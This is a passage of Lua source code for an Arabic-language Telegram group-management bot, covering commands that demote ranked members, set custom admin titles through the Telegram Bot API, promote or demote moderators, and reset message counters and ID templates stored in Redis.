Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Supcreator then
if Rink == 3 or Rink < 3 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Creator then
if Rink == 4 or Rink < 4 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Manger then
if Rink == 5 or Rink < 5 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, Message_Reply.sender.user_id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
elseif msg.Admin then
if Rink == 6 or Rink < 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, Message_Reply.sender.user_id)
end
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• تم تنزيل الشخص من الرتب التاليه { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.."*}","md",true)  
end

if text and text:match('^تنزيل الكل @(%S+)$') then
local UserName = text:match('^تنزيل الكل @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if Redis:sismember(LaRiCa.."Dev:Groups",UserId_Info.id) then
dev = "المطور ،" else dev = "" end
if Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id, UserId_Info.id) then
crr = "منشئ اساسي ،" else crr = "" end
if Redis:sismember(LaRiCa..'Creator:Group'..msg_chat_id, UserId_Info.id) then
cr = "منشئ ،" else cr = "" end
if Redis:sismember(LaRiCa..'Manger:Group'..msg_chat_id, UserId_Info.id) then
own = "مدير ،" else own = "" end
if Redis:sismember(LaRiCa..'Admin:Group'..msg_chat_id, UserId_Info.id) then
mod = "ادمن ،" else mod = "" end
if Redis:sismember(LaRiCa..'Special:Group'..msg_chat_id, UserId_Info.id) then
vip = "مميز ،" else vip = ""
end
if The_ControllerAll(UserId_Info.id) == true then
Rink = 1
elseif Redis:sismember(LaRiCa.."Dev:Groups",UserId_Info.id)  then
Rink = 2
elseif Redis:sismember(LaRiCa.."Supcreator:Group"..msg_chat_id, UserId_Info.id) then
Rink = 3
elseif Redis:sismember(LaRiCa.."Creator:Group"..msg_chat_id, UserId_Info.id) then
Rink = 4
elseif Redis:sismember(LaRiCa.."Manger:Group"..msg_chat_id, UserId_Info.id) then
Rink = 5
elseif Redis:sismember(LaRiCa.."Admin:Group"..msg_chat_id, UserId_Info.id) then
Rink = 6
elseif Redis:sismember(LaRiCa.."Special:Group"..msg_chat_id, UserId_Info.id) then
Rink = 7
else
Rink = 8
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• ليس لديه اي رتبه هنا*","md",true)  
end
if msg.ControllerBot then
if Rink == 1 or Rink < 1 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Dev:Groups",UserId_Info.id)
Redis:srem(LaRiCa.."Supcreator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Dev then
if Rink == 2 or Rink < 2 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Supcreator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Supcreator then
if Rink == 3 or Rink < 3 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Creator:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Creator then
if Rink == 4 or Rink < 4 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Manger:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Manger then
if Rink == 5 or Rink < 5 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Admin:Group"..msg_chat_id, UserId_Info.id)
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, UserId_Info.id)
elseif msg.Admin then
if Rink == 6 or Rink < 6 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكن تنزيل رتبه نفس رتبتك ولا اعلى من رتبتك*","md",true)  
end
Redis:srem(LaRiCa.."Special:Group"..msg_chat_id, UserId_Info.id)
end
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• تم تنزيل الشخص من الرتب التاليه { "..dev..""..crr..""..cr..""..own..""..mod..""..vip.."*}","md",true)  
end

if text and text:match('ضع لقب (.*)') and msg.reply_to_message_id ~= 0 then
local CustomTitle = text:match('ضع لقب (.*)')
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg_chat_id .. "&user_id=" ..Message_Reply.sender.user_id.."&can_invite_users=True")
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم وضع له لقب : "..CustomTitle).Reply,"md",true)  
https.request("https://api.telegram.org/bot"..Token.."/setChatAdministratorCustomTitle?chat_id="..msg_chat_id.."&user_id="..Message_Reply.sender.user_id.."&custom_title="..CustomTitle)
end
if text and text:match('^ضع لقب @(%S+) (.*)$') then
local UserName = {text:match('^ضع لقب @(%S+) (.*)$')}
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName[1])
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName[1]:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
https.request("https://api.telegram.org/bot" .. Token .. "/promoteChatMember?chat_id=" .. msg_chat_id .. "&user_id=" ..UserId_Info.id.."&can_invite_users=True")
LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم وضع له لقب : "..UserName[2]).Reply,"md",true)  
https.request("https://api.telegram.org/bot"..Token.."/setChatAdministratorCustomTitle?chat_id="..msg_chat_id.."&user_id="..UserId_Info.id.."&custom_title="..UserName[2])
end

if text == "تصفيه" or text == "تنزيل جميع الرتب" then
if not msg.Supcreatorm then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
end
if Redis:smembers(LaRiCa.."Supcreator:Group"..msg_chat_id) then
Redis:del(LaRiCa.."Supcreator:Group"..msg_chat_id) 
end
if Redis:smembers(LaRiCa.."Creator:Group"..msg_chat_id) then
Redis:del(LaRiCa.."Creator:Group"..msg_chat_id) 
end
if Redis:smembers(LaRiCa.."Manger:Group"..msg_chat_id) then
Redis:del(LaRiCa.."Manger:Group"..msg_chat_id) 
end
if Redis:smembers(LaRiCa.."Admin:Group"..msg_chat_id) then
Redis:del(LaRiCa.."Admin:Group"..msg_chat_id) 
end
if Redis:smembers(LaRiCa.."Special:Group"..msg_chat_id) then
Redis:del(LaRiCa.."Special:Group"..msg_chat_id) 
end
return LuaTele.sendText(msg_chat_id,msg_id,"تم مسح جميع رتب المجموعه \nالمنشئين الاساسيين \nالمنشئين\nالمدراء\nالادمنيه\nالمميزين","md",true)
end


if text == 'لقبي'  then
Ge = https.request("https://api.telegram.org/bot".. Token.."/getChatMember?chat_id=" .. msg_chat_id .. "&user_id=" ..msg.sender.user_id)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
LuaTele.sendText(msg_chat_id,msg_id,'*• ليس لديك لقب*',"md",true) 
else
LuaTele.sendText(msg_chat_id,msg_id,'• لقبك هو : '..GeId.result.custom_title,"md",true) 
end
end
if text == ('رفع مشرف') and msg.reply_to_message_id ~= 0 then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'administrator',{1 ,1, 0, 0, 0, 0, 0 , 0, 0, 0, 0, 0, ''})
if SetAdmin.code == 3 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكنني رفعه ليس لدي صلاحيات*","md",true)  
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- تعديل الصلاحيات ', data = msg.sender.user_id..'/groupNumseteng//'..Message_Reply.sender.user_id}, 
},
}
}
return LuaTele.sendText(msg_chat_id, msg_id, "• صلاحيات المستخدم - ", 'md', false, false, false, false, reply_markup)
end
if text and text:match('^رفع مشرف @(%S+)$') then
local UserName = text:match('^رفع مشرف @(%S+)$')
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'administrator',{1 ,1, 0, 0, 0, 0, 0 , 0, 0, 0, 0, 0, ''})
var(SetAdmin)
if SetAdmin.code == 3 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكنني رفعه ليس لدي صلاحيات*","md",true)  
end
local reply_markup = LuaTele.replyMarkup{
type = 'inline',
data = {
{
{text = '- تعديل الصلاحيات ', data = msg.sender.user_id..'/groupNumseteng//'..UserId_Info.id}, 
},
}
}
return LuaTele.sendText(msg_chat_id, msg_id, "• صلاحيات المستخدم - ", 'md', false, false, false, false, reply_markup)
end 
if text == ('تنزيل مشرف') and msg.reply_to_message_id ~= 0 then
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,Message_Reply.sender.user_id,'administrator',{0 ,0, 0, 0, 0, 0, 0 ,0, 0})
if SetAdmin.code == 400 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لست انا من قام برفعه*","md",true)  
end
if SetAdmin.code == 3 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكنني تنزيله ليس لدي صلاحيات*","md",true)  
end
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"• تم تنزيله من المشرفين ").Reply,"md",true)  
end
if text and text:match('^تنزيل مشرف @(%S+)$') then
local UserName = text:match('^تنزيل مشرف @(%S+)$')
if not msg.Supcreator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(4)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).SetAdmin == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه اضافة مشرفين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
local SetAdmin = LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'administrator',{0 ,0, 0, 0, 0, 0, 0 ,0, 0})
if SetAdmin.code == 400 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لست انا من قام برفعه*","md",true)  
end
if SetAdmin.code == 3 then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• لا يمكنني تنزيله ليس لدي صلاحيات*","md",true)  
end
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تنزيله من المشرفين ").Reply,"md",true)  
end 
if text == 'مسح رسائلي' then
Redis:del(LaRiCa..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id)
LuaTele.sendText(msg_chat_id,msg_id,'• تم مسح جميع رسائلك ',"md",true)  
elseif text == 'مسح تعديلاتي' or text == 'مسح تعديلاتي' then
Redis:del(LaRiCa..'Num:Message:Edit'..msg.chat_id..':'..msg.sender.user_id)
LuaTele.sendText(msg_chat_id,msg_id,'• تم مسح جميع تعديلاتك ',"md",true)  
elseif text == 'مسح جهاتي' then
Redis:del(LaRiCa..'Num:Add:Memp'..msg.chat_id..':'..msg.sender.user_id)
LuaTele.sendText(msg_chat_id,msg_id,'• تم مسح جميع جهاتك المضافه ',"md",true)  
elseif text == 'رسائلي' then
LuaTele.sendText(msg_chat_id,msg_id,'• عدد رسائلك هنا*~ '..(Redis:get(LaRiCa..'Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) or 1)..'*',"md",true)  
elseif text == 'تعديلاتي' or text == 'تعديلاتي' then
LuaTele.sendText(msg_chat_id,msg_id,'• عدد التعديلات هنا*~ '..(Redis:get(LaRiCa..'Num:Message:Edit'..msg.chat_id..msg.sender.user_id) or 0)..'*',"md",true)  
elseif text == 'جهاتي' then
LuaTele.sendText(msg_chat_id,msg_id,'• عدد جهاتك المضافه هنا*~ '..(Redis:get(LaRiCa.."Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0)..'*',"md",true)  
elseif text == 'مسح' and msg.reply_to_message_id ~= 0 and msg.Admin then
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
LuaTele.deleteMessages(msg.chat_id,{[1]= msg.reply_to_message_id})
LuaTele.deleteMessages(msg.chat_id,{[1]= msg_id})
end
if text == 'تعين الايدي عام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Redis:Id:Groups"..msg.chat_id..""..msg.sender.user_id,240,true)  
return LuaTele.sendText(msg_chat_id,msg_id,[[
• ارسل الان النص
• يمكنك اضافه :
• `#username` » اسم المستخدم
• `#msgs` » عدد الرسائل
• `#photos` » عدد الصور
• `#id` » ايدي المستخدم
• `#auto` » نسبة التفاعل
• `#stast` » رتبة المستخدم 
• `#edit` » عدد التعديلات
• `#game` » عدد النقاط
• `#AddMem` » عدد الجهات
• `#Description` » تعليق الصوره
]],"md",true)    
end 
if text == 'حذف الايدي عام' or text == 'مسح الايدي عام' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Set:Id:Groups")
return LuaTele.sendText(msg_chat_id,msg_id, '• تم ازالة كليشة الايدي العامه',"md",true)  
end

if text == 'تعين الايدي' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:setex(LaRiCa.."Redis:Id:Group"..msg.chat_id..""..msg.sender.user_id,240,true)  
return LuaTele.sendText(msg_chat_id,msg_id,[[
• ارسل الان النص
• يمكنك اضافه :
• `#username` » اسم المستخدم
• `#msgs` » عدد الرسائل
• `#photos` » عدد الصور
• `#id` » ايدي المستخدم
• `#auto` » نسبة التفاعل
• `#stast` » رتبة المستخدم 
• `#edit` » عدد التعديلات
• `#game` » عدد النقاط
• `#AddMem` » عدد الجهات
• `#Description` » تعليق الصوره
]],"md",true)    
end 
if text == 'حذف الايدي' or text == 'مسح الايدي' then
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Set:Id:Group"..msg.chat_id)
return LuaTele.sendText(msg_chat_id,msg_id, '• تم ازالة كليشة الايدي ',"md",true)  
end

if text and text:match("^مسح (.*)$") and msg.reply_to_message_id == 0 then
local TextMsg = text:match("^مسح (.*)$")
if TextMsg == 'المطورين الثانوين' or TextMsg == 'المطورين الثانويين' or TextMsg == 'الثانويين' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Devss:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين ثانوين حاليا , ","md",true)  
end
Redis:del(LaRiCa.."Devss:Groups") 
return LuaTele.sendText(msg_chat_id,msg_id,"*• تم مسح {"..#Info_Members.."} من المطورين الثانويين*","md",true)
end
if TextMsg == 'المطورين' then
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local Info_Members = Redis:smembers(LaRiCa.."Dev:Groups") 
if #Info_Members == 0 then
return LuaTele.sendText(msg_chat_id,msg_id,"• لا يوجد مطورين حاليا , ","md",true)  
end
